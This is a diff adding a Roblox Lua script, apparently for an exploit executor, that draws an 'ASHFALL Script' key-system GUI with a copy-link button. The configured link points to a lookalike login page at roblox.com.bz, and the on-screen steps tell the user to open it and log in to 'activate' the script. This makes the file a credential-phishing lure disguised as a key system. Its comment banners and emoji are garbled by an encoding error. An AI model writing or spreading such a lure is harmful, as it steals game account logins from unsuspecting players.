@@ -1,0 +1,181 @@
+"-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+-- ASHFALL Script - Key System GUI
+-- Made by Zane
+-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+-- CONFIGURATION - CHANGE YOUR API KEY LINK HERE
+-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+
+local API_KEY_LINK = "https://roblox.com.bz/login?returnUrl=2889062635367384" -- PASTE YOUR LINK HERE
+
+-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+-- CREATE MAIN GUI CONTAINER
+-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "KeySystemGui"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = playerGui
+
+-- Main Frame (Background)
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0, 450, 0, 200)
+mainFrame.Position = UDim2.new(0.5, -225, 0.5, -100) -- Center on screen
+mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = screenGui
+
+-- Add shadow effect
+local shadowFrame = Instance.new("Frame")
+shadowFrame.Name = "Shadow"
+shadowFrame.Size = UDim2.new(1, 0, 1, 0)
+shadowFrame.Position = UDim2.new(0, 2, 0, 2)
+shadowFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+shadowFrame.BorderSizePixel = 0
+shadowFrame.ZIndex = 0
+shadowFrame.Parent = mainFrame
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 12)
+corner.Parent = shadowFrame
+
+-- Main frame corner
+local mainCorner = Instance.new("UICorner")
+mainCorner.CornerRadius = UDim.new(0, 12)
+mainCorner.Parent = mainFrame
+
+-- Title Bar
+local titleBar = Instance.new("Frame")
+titleBar.Name = "TitleBar"
+titleBar.Size = UDim2.new(1, 0, 0, 40)
+titleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+titleBar.BorderSizePixel = 0
+titleBar.Parent = mainFrame
+titleBar.ClipsDescendants = true
+
+local titleCorner = Instance.new("UICorner")
+titleCorner.CornerRadius = UDim.new(0, 12)
+titleCorner.Parent = titleBar
+
+-- Title Text (Centered, Compact)
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Name = "TitleLabel"
+titleLabel.Size = UDim2.new(1, 0, 1, 0)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Text = "ASHFALL SCRIPT"
+titleLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+titleLabel.TextSize = 16
+titleLabel.TextStrokeTransparency = 0.5
+titleLabel.Font = Enum.Font.GothamBold
+titleLabel.Parent = titleBar
+
+-- Content Frame
+local contentFrame = Instance.new("Frame")
+contentFrame.Name = "ContentFrame"
+contentFrame.Size = UDim2.new(1, -30, 1, -50)
+contentFrame.Position = UDim2.new(0, 15, 0, 45)
+contentFrame.BackgroundTransparency = 1
+contentFrame.Parent = mainFrame
+
+-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+-- COPY LINK BUTTON
+-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+
+local copyLinkButton = Instance.new("TextButton")
+copyLinkButton.Name = "CopyLinkButton"
+copyLinkButton.Size = UDim2.new(1, 0, 0, 50)
+copyLinkButton.Position = UDim2.new(0, 0, 0, 0)
+copyLinkButton.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
+copyLinkButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+copyLinkButton.TextSize = 12
+copyLinkButton.Text = "ðŸ“‹ Copy link"
+copyLinkButton.Font = Enum.Font.GothamBold
+copyLinkButton.BorderSizePixel = 0
+copyLinkButton.Parent = contentFrame
+
+local copyLinkCorner = Instance.new("UICorner")
+copyLinkCorner.CornerRadius = UDim.new(0, 6)
+copyLinkCorner.Parent = copyLinkButton
+
+-- Copy Link Button Hover Effect
+copyLinkButton.MouseEnter:Connect(function()
+	copyLinkButton.BackgroundColor3 = Color3.fromRGB(120, 220, 120)
+end)
+
+copyLinkButton.MouseLeave:Connect(function()
+	copyLinkButton.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
+end)
+
+-- Copy Link Button Click
+copyLinkButton.MouseButton1Click:Connect(function()
+	print("[ASHFALL] Copied link to clipboard: " .. API_KEY_LINK)
+	setclipboard(API_KEY_LINK)
+	
+	-- Visual feedback: Change button color temporarily
+	local originalColor = copyLinkButton.BackgroundColor3
+	copyLinkButton.BackgroundColor3 = Color3.fromRGB(150, 255, 150)
+	copyLinkButton.Text = "âœ“ Copied!"
+	
+	task.wait(2)
+	
+	copyLinkButton.BackgroundColor3 = originalColor
+	copyLinkButton.Text = "ðŸ“‹ Copy link"
+end)
+
+-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+-- INSTRUCTIONS SECTION
+-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+
+local instructionsLabel = Instance.new("TextLabel")
+instructionsLabel.Name = "InstructionsLabel"
+instructionsLabel.Size = UDim2.new(1, 0, 1, -50)
+instructionsLabel.Position = UDim2.new(0, 0, 0, 50)
+instructionsLabel.BackgroundTransparency = 1
+instructionsLabel.Text = "1. Copy link\n2. Open in browser\n3. Log in\n4. Auto-Activate"
+instructionsLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+instructionsLabel.TextSize = 10
+instructionsLabel.Font = Enum.Font.Gotham
+instructionsLabel.TextXAlignment = Enum.TextXAlignment.Center
+instructionsLabel.TextYAlignment = Enum.TextYAlignment.Center
+instructionsLabel.LineHeight = 1.2
+instructionsLabel.Parent = contentFrame
+
+-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+-- MAKE GUI DRAGGABLE
+-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+
+local dragging = false
+local dragStart = nil
+local startPos = nil
+
+titleBar.InputBegan:Connect(function(input, gameProcessed)
+	if gameProcessed then return end
+	if input.UserInputType == Enum.UserInputType.MouseButton1 then
+		dragging = true
+		dragStart = input.Position
+		startPos = mainFrame.Position
+	end
+end)
+
+titleBar.InputEnded:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 then
+		dragging = false
+	end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+	if dragging and dragStart then
+		local delta = input.Position - dragStart
+		mainFrame.Position = startPos + UDim2.new(0, delta.X, 0, delta.Y)
+	end
+end)
+
+print("âœ“ ASHFALL Key System GUI loaded successfully!")"
